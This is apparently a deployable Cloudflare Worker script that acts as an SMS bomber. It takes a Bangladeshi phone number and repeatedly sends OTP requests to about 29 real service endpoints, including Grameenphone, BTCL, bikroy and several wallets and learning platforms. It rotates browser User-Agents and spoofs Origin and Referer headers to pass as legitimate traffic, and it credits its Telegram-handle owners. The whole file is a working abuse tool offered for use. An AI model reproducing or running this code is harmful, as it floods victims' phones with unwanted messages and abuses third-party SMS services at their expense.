export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone') || url.searchParams.get('number');
    const loops = Math.min(parseInt(url.searchParams.get('loops')) || 10, 10);

    // ===== ফোন ভ্যালিডেশন =====
    if (!phone || phone.trim() === '') {
      return jsonResponse({
        error: "Mobile number is required",
        usage: "?phone=01XXXXXXXXX&loops=10",
        Api_Owner: '@MehediSanix',
        Telegram: '@CobraX_Empire',
        Developer: '@XrootCodeX'
      }, 400);
    }

    if (!/^01[3-9][0-9]{8}$/.test(phone)) {
      return jsonResponse({
        error: "Invalid Bangladeshi phone number",
        hint: "Format: 01XXXXXXXXX (e.g. 01712345678)",
        Api_Owner: '@MehediSanix',
        Telegram: '@CobraX_Empire',
        Developer: '@XrootCodeX'
      }, 400);
    }

    // ===== API তালিকা (২৯টি) =====
    const apis = [
      { url: "https://waltonplaza.com.bd/api/auth/otp/create", data: { auth: { countryCode: "880", deviceUuid: "ee757830-f639-12f0-9f4d-2f972746fhg", phone }, captchaToken: "recapcha" } },
      { url: "https://api.apex4u.com/api/auth/login", data: { phoneNumber: phone } },
      { url: "https://core.easy.com.bd/api/v1/forgot-password-otp", data: { device_key: "2ea97d276a980993308116baa292cec9", mobile: phone } },
      { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login", data: { phone } },
      { url: "https://api.chardike.com/api/otp/send", data: { phone, otp_type: "login" } },
      { url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", data: { phoneNbr: phone, OTPType: 1.0, userName: "", email: "" } },
      { url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", data: { phone } },
      { url: "https://gateway.otithee.com/api/v1/generate-otp", data: { request_type: "registration", mobile_number: phone } },
      { url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", data: { country_code: "+88", phone } },
      { url: "https://new.mojaru.com/api/student/login", data: { mobile_or_email: phone } },
      { url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", data: { mobileNumber: phone } },
      { url: "https://api.garibookadmin.com/api/v3/user/login", data: { recaptcha_token: "garibookcaptcha", mobile: phone, channel: "web" } },
      { url: "https://api-dynamic.bioscopelive.com/v2/auth/login", data: { number: phone } },
      { url: "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo=" + phone, data: null, isGet: true },
      { url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", data: { wallet_number: phone, geo_location: { lat: 23.8979093, long: 89.1356346 }, referral: "", firebase_token: "e7XC0AWRR5C6rGMm6yCaZ8:APA91bHnbvs1bA_qXXb55W9GmsKmuzAUkgaR770HBH9hZCLjFV6HCejAsRGggvnD7c5dv2q_pOAdwY1peeTlzzn49cjPESTZ0NdR-bIhwe9_6of6rosH0AI", device_uuid: "c65m117a8cbf5b1851b29f8b", mno: "Robi" } },
      { url: "https://api-dynamic.chorki.com/v2/auth/login", data: { number: phone } },
      { url: "https://api.deeptoplay.com/v2/auth/login", data: { number: phone } },
      { url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", data: { phoneNumber: phone } },
      { url: "https://bb-api.bohubrihi.com/public/activity/otp", data: { phone, intent: "login" } },
      { url: "https://backend.timezonebd.com/api/v1/user/otp-login", data: { phone } },
      { url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", data: { phone, language: "en", email: "" } },
      { url: "https://api.shikho.com/public/activity/otp", data: { phone, intent: "ap-discount-request" } },
      { url: "https://edgecoursebd.com/register", data: { phone } },
      { url: "https://api.ghoorilearning.com/api/auth/signup/otp", data: { mobile_no: phone } },
      { url: "https://api.ostad.app/api/v2/user/with-otp", data: { msisdn: phone } },
      { url: "https://www.ieducationbd.com/api/account/check_user", data: { mobile: phone } },
      { url: "https://apialpha.pbs.com.bd/api/OTP/generateOTP", data: { userPhone: phone, otp: "" } },
      { url: "https://www.shwapno.com/api/auth", data: { phoneNumber: phone } },
      { url: "https://api.osudpotro.com/api/v1/users/send_otp", data: { mobile: phone, deviceToken: "web", language: "en", os: "web" } }
    ];

    // ===== র‍্যান্ডম User-Agent =====
    const userAgents = [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
    ];
    const getUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];

    // ===== সিঙ্গেল API হিট =====
    const hitApi = async (api) => {
      const headers = {
        'Content-Type': 'application/json',
        'User-Agent': getUA(),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8'
      };
      try {
        const origin = new URL(api.url).origin;
        headers['Origin'] = origin;
        headers['Referer'] = origin + "/";
      } catch (_) {}

      const opts = { method: api.isGet ? "GET" : "POST", headers };
      if (!api.isGet && api.data) opts.body = JSON.stringify(api.data);

      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 10000);
        opts.signal = controller.signal;
        const res = await fetch(api.url, opts);
        clearTimeout(timer);
        return res.ok;
      } catch (_) {
        return false;
      }
    };

    // ============================================================
    // 🔥 মূল লুপ: একবার হিট = প্রতিটি API-তে 'loops' বার রিকোয়েস্ট
    // ============================================================
    let success = 0, failed = 0;
    const total = apis.length * loops;
    const BATCH_SIZE = 6; // Cloudflare concurrency limit

    for (let round = 1; round <= loops; round++) {
      const roundTasks = apis.map(api => () => hitApi(api));

      for (let i = 0; i < roundTasks.length; i += BATCH_SIZE) {
        const batch = roundTasks.slice(i, i + BATCH_SIZE);
        const results = await Promise.all(batch.map(fn => fn()));
        results.forEach(ok => ok ? success++ : failed++);
      }
    }

    // ===== রেসপন্স =====
    return jsonResponse({
      status: "SMS sent successfully",
      phone: phone,
      loopsPerApi: loops,
      totalApis: apis.length,
      totalRequests: total,
      summary: {
        success: success,
        failed: failed,
        successRate: ((success / total) * 100).toFixed(2) + "%"
      },
      Api_Owner: '@MehediSanix',
      Telegram: '@CobraX_Empire',
      Developer: '@XrootCodeX',
      timestamp: new Date().toISOString()
    }, 200);
  }
};

// ===== হেল্পার =====
function jsonResponse(obj, status) {
  return new Response(JSON.stringify(obj, null, 2), {
    status,
    headers: { 'Content-Type': 'application/json; charset=utf-8' }
  });
        }
